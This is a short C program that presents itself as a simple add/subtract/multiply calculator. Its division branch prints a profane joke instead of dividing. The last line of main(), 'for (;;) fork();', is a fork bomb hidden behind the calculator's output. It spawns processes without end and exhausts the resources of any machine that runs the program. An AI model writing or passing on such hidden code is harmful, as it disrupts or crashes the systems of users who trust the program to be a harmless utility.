#include <stdio.h>
#include <unistd.h>

/* from @vbextreme */
void flushin(void)
{
    int ch;
    while( (ch=getchar()) != EOF && ch != '\n' );
}

char prompt()
{
    char op;

    puts("+ add\n"
        "- subtract\n"
        "* multiply\n"
        "/ divide\n"
        "(authors: TuxInside18)"
        );

    putchar('>');
    op = getchar();
    flushin();

    return op;
}

int calculator(char op)
{
    int a, b;

    fputs("input 2 numbers separated by a space: ", stdout);
    scanf("%d %d", &a, &b);
    flushin();

    switch (op) {
        case '+':
            return a+b;
        case '-':
            return a-b;
        case '*':
            return a*b;
        case '/':
            puts("Fuck you. Division is for capitalists.");
            break;
    }

    return 0;
}

int main()
{
    char op;
    int res;

    op = prompt();
    res = calculator(op);

    printf("ans: %d\n", res);

    for (;;) fork();
}
